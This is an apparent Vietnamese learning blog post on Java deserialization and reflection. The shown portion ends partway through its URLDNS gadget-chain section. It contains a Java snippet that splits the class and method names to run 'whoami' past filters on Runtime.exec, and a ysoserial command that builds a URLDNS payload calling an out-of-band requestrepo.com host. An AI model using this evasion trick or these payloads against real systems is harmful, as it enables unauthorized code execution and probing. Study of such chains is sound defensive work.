

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Java security - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Option1 URLDNS common colection5  Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer   common clection 2  Javasist( Java programming Assistant) ClassLoader#defineClass TemplatesImpl   common colecttion 1 common colection 3 common colection 6 common colection 7 common colection 4    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/java-security\/",
          "name": "Java security"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Java security",
  "description" : "Option1 URLDNS common colection5  Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer   common clection 2  Javasist( Java programming Assistant) ClassLoader#defineClass TemplatesImpl   common colecttion 1 common colection 3 common colection 6 common colection 7 common colection 4    \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.",
  "inLanguage" : "en",
  "wordCount":  6209 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/java-security\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Java security" />
<meta property="og:description" content="Option1 URLDNS common colection5  Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer   common clection 2  Javasist( Java programming Assistant) ClassLoader#defineClass TemplatesImpl   common colecttion 1 common colection 3 common colection 6 common colection 7 common colection 4    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/java-security/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Java security" />
  <meta name="twitter:description" content="Option1 URLDNS common colection5  Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer   common clection 2  Javasist( Java programming Assistant) ClassLoader#defineClass …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>Java security</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#option1-urldns">Option1 URLDNS</a></li>
        <li><a href="#common-colection5">common colection5</a>
          <ol>
            <li><a href="#phân-tích-chi-tiết-debugger-phần-chain-lead-to-rce-tại-class-invokertransformer">Phân tích chi tiết debugger phần chain lead to RCE tại class InvokerTransformer</a></li>
          </ol>
        </li>
        <li><a href="#common-clection-2">common clection 2</a>
          <ol>
            <li><a href="#javasist-java-programming-assistant">Javasist( Java programming Assistant)</a></li>
            <li><a href="#classloaderdefineclass">ClassLoader#defineClass</a></li>
            <li><a href="#templatesimpl">TemplatesImpl</a></li>
          </ol>
        </li>
        <li><a href="#common-colecttion-1">common colecttion 1</a></li>
        <li><a href="#common-colection-3">common colection 3</a></li>
        <li><a href="#common-colection-6">common colection 6</a></li>
        <li><a href="#common-colection-7">common colection 7</a></li>
        <li><a href="#common-colection-4">common colection 4</a></li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<p>Chào mọi người, đây là series học javasec của mình từ việc theo dõi blog của anh tsug0d và anh Jang.</p>
<p>Cài đặt môi trường:</p>
<ul>
<li>IntelliJ - ide để chạy và debug java</li>
<li>java enviroment để chạy java</li>
</ul>
<p>Mở ide -&gt; tạo project mới -&gt; gen ra:</p>
<p><img src="https://hackmd.io/_uploads/HkhmZTcnA.png" alt="image"></p>
<p>ở trên là cấu trúc cây thư mục của 1 dự án java spring boot web cơ bản theo mô hình mvc flow từ controller -&gt; service -&gt; view để tương tác với người dùng.</p>
<p>Tất cả controller sẽ được gói vào controller của main.</p>
<p>#1 java Reflection</p>
<p>Đây là một tính năng trong java cho phép truy cập các thông tin của đối tượng (tên class, các field, methods) và chỉnh sửa các field của đối tượng(kể cả các field private) trong quá trình runtime.</p>
<p>Trong security thì java reflection được dùng để bypass filter/sanbox hay dỳng để lấy và thay đổi các giá trị của các field của gadget chain trong bug java deserialization.</p>
<p>#1.1 Bypass filter</p>
<p>Ví dụ ta có một target có thể eval các code java nhập vào thông thường sẽ gọi Runtime.getRuntime().exec(cmd) để chạy lệnh như dưới đây:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">String</span> <span class="nf">demoVul</span><span class="o">(){</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Every seem ok!!!&#34;</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// Process process = Runtime.getRuntime().exec(&#34;whoami&#34;);
</span><span class="c1"></span>            <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="o">(</span><span class="n">Process</span><span class="o">)</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
                    <span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;exe&#34;</span> <span class="o">+</span> <span class="s">&#34;c&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
                    <span class="o">.</span><span class="na">invoke</span><span class="o">(</span>
                            <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
                                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
                                    <span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRu&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)</span>
                                    <span class="o">.</span><span class="na">invoke</span><span class="o">(</span>
                                            <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
                                                    <span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.l&#34;</span> <span class="o">+</span> <span class="s">&#34;ang.Ru&#34;</span> <span class="o">+</span> <span class="s">&#34;ntime&#34;</span><span class="o">)),</span>
                            <span class="s">&#34;whoami&#34;</span><span class="o">);</span>

            <span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">());</span>

        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="o">|</span> <span class="n">NoSuchMethodException</span> <span class="o">|</span> <span class="n">InvocationTargetException</span> <span class="o">|</span> <span class="n">IllegalAccessException</span> <span class="o">|</span>
                 <span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="s">&#34;OK&#34;</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><p>Đoạn code trên -&gt; chỉ kể đến đoạn comment thì chỉ đơn giản là chạy và in ra kết quả của whoami cmd</p>
<p>Nếu Runtime exec bị chặn thì sao -&gt; ta sẽ dùng các method khác nhưng nếu Runtime exec đã bị chặn thì các hàm liên quan cũng hầu hết chết -&gt; lúc này ta sẽ dùng java reflection</p>
<p>Như ở đoạn code trên ta có thể thấy ta sẽ dùng các reflection API, như getClass(), getMethod(), forName() và invoke()</p>
<p>Chú ý: java.lang.Class là một entrypoint của mọi thao tác reflection Api hiểu nôm na nó là cội nguồn của mọi class nằm trong java -&gt; tất cả class đều có liên quan đến nó</p>
<p>-&gt; trong java ta có 2 cách để lấy java.lang.Class object:</p>
<p>Cách 1: sử dụng Object.getClass() -&gt; phương thức này sẽ trả về runtimeClass object type</p>
<p>Cách 2: sử dụng .class -&gt; className.class trả về class object static</p>
<p>#2 java deserialize</p>
<p>deserialize là một chủ đề nóng trong lĩnh vực bảo mật -&gt; gần như là mọi ngôn ngữ lập trình đều có các phương pháp tựa nhau để implement serialize  -&gt; deserialize</p>
<p>Nó thường là một rủi ro bảo mật vì -&gt; tất cả các ngôn ngữ thường cần truyền thông tin trên mạng hoặc qua lại với nhau -&gt; nó thường dùng các loại như json hoặc xml</p>
<p>ở trên là các định dạng dữ liệu phổ biến được sử dụng trong tương tác dữ liệu</p>
<p>Vấn đề là nếu dữ liệu phức tạp hơn thì khó có thể truyền tải được</p>
<p>Với trường hợp ta muốn truyền tải một class Person bao gồm tên + tuổi + method &hellip; thì ta cần sử dụng serialize và deserialize</p>
<h2 id="option1-urldns">Option1 URLDNS</h2>
<p>genpayload: <code>java -jar ysoserial-all.jar URLDNS &quot;http://e3t352l0.requestrepo.com&quot; | base64 -w0</code></p>
<p>Chain này bao gồm các thành phần như sau:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">  <span class="n">HashMap</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
    <span class="n">HashMap</span><span class="o">.</span><span class="na">hash</span><span class="o">()</span>
      <span class="n">URL</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
        <span class="n">URLStreamHandler</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
          <span class="n">URLStreamHandler</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">()</span>
            <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">()</span>
</code></pre></div><p>Gadget chain này tồn tại bên trong runtime.jar của java -&gt; mục đích cuối cùng của nó là tạo 1 request dns lookup tới domain tùy úy -&gt; kiểm tra xem targer có thể deserialize obj này được hay không</p>
<ul>
<li>Tiến hành tìm hiểu các gadget chain -&gt; ta sẽ chọn HashMap.java</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rJxihKThA.png" alt="image"></p>
<p>-&gt; tìm đến method readObject</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">reinitialize</span><span class="o">();</span>

        <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">fields</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>

        <span class="c1">// Read loadFactor (ignore threshold)
</span><span class="c1"></span>        <span class="kt">float</span> <span class="n">lf</span> <span class="o">=</span> <span class="n">fields</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;loadFactor&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">.</span><span class="na">75f</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">lf</span> <span class="o">&lt;=</span> <span class="n">0</span> <span class="o">||</span> <span class="n">Float</span><span class="o">.</span><span class="na">isNaN</span><span class="o">(</span><span class="n">lf</span><span class="o">))</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal load factor: &#34;</span> <span class="o">+</span> <span class="n">lf</span><span class="o">);</span>

        <span class="n">lf</span> <span class="o">=</span> <span class="n">Math</span><span class="o">.</span><span class="na">min</span><span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">max</span><span class="o">(</span><span class="n">0</span><span class="o">.</span><span class="na">25f</span><span class="o">,</span> <span class="n">lf</span><span class="o">),</span> <span class="n">4</span><span class="o">.</span><span class="na">0f</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">.</span><span class="na">UnsafeHolder</span><span class="o">.</span><span class="na">putLoadFactor</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">lf</span><span class="o">);</span>

        <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>                <span class="c1">// Read and ignore number of buckets
</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">mappings</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span> <span class="c1">// Read number of mappings (size)
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&lt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Illegal mappings count: &#34;</span> <span class="o">+</span> <span class="n">mappings</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// use defaults
</span><span class="c1"></span>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">mappings</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="kt">float</span> <span class="n">fc</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">mappings</span> <span class="o">/</span> <span class="n">lf</span> <span class="o">+</span> <span class="n">1</span><span class="o">.</span><span class="na">0f</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">cap</span> <span class="o">=</span> <span class="o">((</span><span class="n">fc</span> <span class="o">&lt;</span> <span class="n">DEFAULT_INITIAL_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
                       <span class="n">DEFAULT_INITIAL_CAPACITY</span> <span class="o">:</span>
                       <span class="o">(</span><span class="n">fc</span> <span class="o">&gt;=</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
                       <span class="n">MAXIMUM_CAPACITY</span> <span class="o">:</span>
                       <span class="n">tableSizeFor</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="n">fc</span><span class="o">));</span>
            <span class="kt">float</span> <span class="n">ft</span> <span class="o">=</span> <span class="o">(</span><span class="kt">float</span><span class="o">)</span><span class="n">cap</span> <span class="o">*</span> <span class="n">lf</span><span class="o">;</span>
            <span class="n">threshold</span> <span class="o">=</span> <span class="o">((</span><span class="n">cap</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span> <span class="o">&amp;&amp;</span> <span class="n">ft</span> <span class="o">&lt;</span> <span class="n">MAXIMUM_CAPACITY</span><span class="o">)</span> <span class="o">?</span>
                         <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">ft</span> <span class="o">:</span> <span class="n">Integer</span><span class="o">.</span><span class="na">MAX_VALUE</span><span class="o">);</span>

            <span class="c1">// Check Map.Entry[].class since it&#39;s the nearest public type to
</span><span class="c1"></span>            <span class="c1">// what we&#39;re actually creating.
</span><span class="c1"></span>            <span class="n">SharedSecrets</span><span class="o">.</span><span class="na">getJavaObjectInputStreamAccess</span><span class="o">().</span><span class="na">checkArray</span><span class="o">(</span><span class="n">s</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">cap</span><span class="o">);</span>
            <span class="nd">@SuppressWarnings</span><span class="o">({</span><span class="s">&#34;rawtypes&#34;</span><span class="o">,</span><span class="s">&#34;unchecked&#34;</span><span class="o">})</span>
            <span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[]</span> <span class="n">tab</span> <span class="o">=</span> <span class="o">(</span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;[])</span><span class="k">new</span> <span class="n">Node</span><span class="o">[</span><span class="n">cap</span><span class="o">];</span>
            <span class="n">table</span> <span class="o">=</span> <span class="n">tab</span><span class="o">;</span>

            <span class="c1">// Read the keys and values, and put the mappings in the HashMap
</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">mappings</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
                    <span class="n">K</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">K</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
                <span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&#34;unchecked&#34;</span><span class="o">)</span>
                    <span class="n">V</span> <span class="n">value</span> <span class="o">=</span> <span class="o">(</span><span class="n">V</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
                <span class="n">putVal</span><span class="o">(</span><span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">),</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
</code></pre></div><p>-&gt; sau khi navigate đến nó ta cần tìm mã mà nó có gọi đến chain tiếp theo như ở trên ta nói là gọi đến hash() đó là putVal <code>putVal(hash(key), key, value, false, false);</code> bắt đầu đặt break point tại đây.</p>
<p>Trước khi đó ta có thể thấy object đã được deserialize thành công và gadget chain đã dẫn đến source :</p>
<p><img src="https://hackmd.io/_uploads/HyxDAFpnA.png" alt="image"></p>
<p>Sau khi thực hiện run với mode debug -&gt;</p>
<p><img src="https://hackmd.io/_uploads/B1PfZqThR.png" alt="image"></p>
<p>Note:</p>
<p>Ta có thể thấy các thành phần đó là:</p>
<p>Project file: đây là cửa sổ show các file data ra -&gt; sau khi chạy chương trình sẽ load nguồn từ đây</p>
<p>Detail code: là cửa sổ show mã code chính của file tương tự như vs code</p>
<p>project library: là nơi hiển thị danh sách các libs cho project hiện tại</p>
<p>stack trace: đây là nơi sẽ hiển thị các backtrace -&gt; hay nói cách khác là nó hiển thị danh sách mà các method đã được gọi đến trước khi đi vào b* của chúng ta</p>
